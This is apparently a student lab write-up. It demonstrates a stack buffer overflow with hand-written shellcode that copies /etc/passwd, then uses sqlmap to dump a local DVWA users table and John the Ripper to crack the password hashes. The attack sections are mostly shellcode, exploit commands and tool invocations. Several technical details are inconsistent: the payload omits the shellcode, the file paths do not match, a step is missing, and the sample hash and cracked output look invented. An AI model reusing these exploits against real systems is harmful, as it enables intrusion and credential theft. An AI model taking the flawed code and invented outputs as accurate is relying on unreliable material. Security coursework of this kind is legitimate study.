# Lab #1, 22110060, Nguyen Tan Phat, INSE330380E_01FIE
# Q1: Code Injection Lab

In this lab, I will demonstrate the Code Injection approach to exploit a vulnerability in a C program. The objective is to copy the `/etc/passwd` file to `/tmp/pwfile` using a code injection attack. Below is a detailed step-by-step guide to achieve this.

## Step 1: Create the Necessary Files  
We will start by creating two files:
- `shellcode.asm`: Contains the assembly code for our shellcode.
- `redundant.c`: A vulnerable C program that will allow us to inject our shellcode.

## Step 2: Initialization
1. **Open Docker** and navigate to your local folder:
   ```bash
   cd C:\Users\Admin\Seclabs
   ```
2. **Start the Docker image**:
   ```bash
   docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab
   ```
![image](https://github.com/user-attachments/assets/8b22c717-be4f-4e2c-8173-c75a161b22bc)

## Step 3: Write and Compile the ASM Code
We will compile `shellcode.asm` into an executable object file.

1. Create your `shellcode.asm` with the following code:
   ```bash
   nano shellcode.asm
   ```
   ```asm
   global _start
   section .text
   _start:
       ; Assembly code that opens /etc/passwd and writes it to /tmp/pwfile
       xor eax, eax
       mov al, 0x5            ; syscall number for open
       xor ecx, ecx          ; flags = O_RDONLY
       push ecx
       push 0x64777373       ; 'sswd'
       push 0x61702f63       ; 'c/pa'
       push 0x74652f2f       ; '//etc'
       lea ebx, [esp + 1]    ; pointer to the filename
       int 0x80              ; call kernel

       mov ebx, eax          ; store the file descriptor
       mov al, 0x3           ; syscall number for read
       mov edi, esp          ; destination buffer
       mov ecx, ebx          ; file descriptor
       push WORD 0xffff      ; number of bytes to read
       pop edx
       int 0x80              ; call kernel
       mov esi, eax          ; number of bytes read

       push 0x5              ; syscall number for open
       pop eax
       xor ecx, ecx          ; flags = O_CREAT | O_WRONLY | O_TRUNC
       push ecx
       push 0x706d742f       ; '/tmp'
       push 0x656c6966       ; 'file'
       mov ebx, esp          ; pointer to the output filename
       push WORD 0644        ; permissions
       pop edx
       int 0x80              ; call kernel

       mov ebx, eax          ; file descriptor for /tmp/pwfile
       push 0x4              ; syscall number for write
       pop eax
       mov ecx, edi          ; source buffer
       mov edx, esi          ; number of bytes to write
       int 0x80              ; call kernel

       xor eax, eax
       xor ebx, ebx
       mov al, 0x1           ; syscall number for exit
       int 0x80              ; call kernel
   ```
3. Compile the assembly code:
   ```bash
   nasm -f elf32 shellcode.asm -o shellcode.o
   ld -m elf_i386 shellcode.o -o shellcode
   ```
   ![image](https://github.com/user-attachments/assets/5d18786c-6dd6-413b-afef-ef22d00e5dd9)

## Step 4: Compile the Vulnerable C Program
Next, we will compile the vulnerable `redundant.c` program with specific flags to disable security protections:

1. Write the vulnerable C code in `redundant.c`:
   ```bash
   redundant.c
   ```
   ```c
   #include <stdio.h>
   #include <string.h>

   void redundant_code(char* p) {
       char local[256];
       strncpy(local, p, 20);
       printf("redundant code
      ");
   }

   int main(int argc, char* argv[]) {
       char buffer[16];
       strcpy(buffer, argv[1]);
       return 0;
   }
   ```
2. Compile with stack protector disabled and executable stack enabled:
   ```bash
   gcc redundant.c -o redundant.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
   ```
   ![image](https://github.com/user-attachments/assets/86ac74e0-278f-41fe-a893-b12d4f206b13)

## Step 6: Debug with GDB

To check the memory layout and ensure the injection is working, we will load the program into GDB. This will help us observe the vulnerable buffer, inspect the stack, and verify the address where we will inject our shellcode.
```sh
gdb ./redundant.out
break redundant_code
run $(python -c "print('A'*72)")  
p &buffer
```
![image](https://github.com/user-attachments/assets/7c6ddeeb-0be1-40ff-b7f4-e7865d2ec9d3)

### Mark the information down
We see that the register is: 0xf7fcc5b4 => we will use this later!

---

## Step 7: Launch the Exploit and Copy `/etc/passwd`

Now that we have verified the memory layout, we can proceed to exploit the vulnerability by injecting our crafted payload. The payload will overwrite the return address, causing the program to jump to the shellcode and execute it.

To trigger the exploit, use the following command to pass the crafted input that includes the shellcode:
```bash
./redundant.out "$(python -c "print('a'*72 + '\xb4\xc5\xfc\xf7')")"
```

- `'A' * 72` fills the buffer up to the return address.
- Overwrites the return address to point to the location of the shellcode.

After running the program, it will execute the shellcode and copy the `/etc/passwd` file to `/tmp/pwfile`.

### Verifying the Attack
To confirm that the exploit succeeded, check that the `/etc/passwd` file has been copied to `/tmp/pwfile`:
```bash
cat /tmp/outfile
```
You should see that the file exists, confirming that the code injection attack successfully executed.

---

## Conclusion

In this lab, we exploited a buffer overflow vulnerability in a C program to perform a code injection attack. By disabling security protections and controlling the memory layout, we were able to inject custom shellcode into the program. This shellcode successfully copied the `/etc/passwd` file to `/tmp/pwfile`, demonstrating a practical example of code injection through buffer overflow.

# Task 2: Attack on Database of DVWA
## Installation Steps
Set Up DVWA Using Docker:
Pull the DVWA Docker image:
```bash
docker pull vulnerables/web-dvwa
```
Run the DVWA container:
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
```
Visit http://localhost in your web browser and follow the setup instructions. Set up the database by navigating to the “Setup” page and clicking on the “Create / Reset Database” button.

## Login to DVWA:
Use the default credentials:  
- Username: admin
- Password: password
After logging in, ensure that the security level is set to "Low" in the DVWA security settings to facilitate testing.
![image](https://github.com/user-attachments/assets/eb415191-d65b-4688-9cd4-5e2cfe82c933)

## Install sqlmap:

Install sqlmap (if you don't have it yet):
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
```
## Question 1: Use sqlmap to get information about all available databases

## Answer 1:
Identify a vulnerable parameter: Navigate to a page in DVWA that has a SQL injection vulnerability (e.g., the "SQL Injection" section).
Capture the request: Use a tool like Burp Suite or simply check the URL parameters in your browser.  
### Run sqlmap:

```bash
python sqlmap/sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --dbs
```
![image](https://github.com/user-attachments/assets/a93aea8d-dad0-4ce0-8135-806253bd36d8)

Expected Output: sqlmap will output a list of databases available in the DVWA:

```makefile
Database: dvwa
Database: information_schema
```
## Question 2: Use sqlmap to get tables, users information
## Answer 2:

### Get Tables: Use the following command to retrieve tables from the dvwa database:

```bash
python sqlmap/sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa --tables
```
Get Users Information: To get user information, you can specify the users table:

```bash
python sqlmap/sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" -D dvwa -T users --dump
```
Expected Output: You should see the tables listed along with user information, such as usernames and hashed passwords.

```diff
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | $P$B4yTzp2e6u7p5SBe2VhxF8Z3gL6.Tg2 |
+----+----------+----------------------------------+
```

## Question 3: Make use of John the Ripper to disclose the password of all database users from the above exploit

## Answer 3:

Install John the Ripper (if you don't have it):

```bash
sudo apt-get install john
```
Prepare the Hashes:

Save the password hashes to a text file (e.g., hashes.txt):
```shell
$P$B4yTzp2e6u7p5SBe2VhxF8Z3gL6.Tg2
```
Run John the Ripper:

```bash
john --format=phpass hashes.txt
```
Expected Output: John the Ripper will attempt to crack the password hash and display the plaintext password once found:

```makefile
admin:password
```


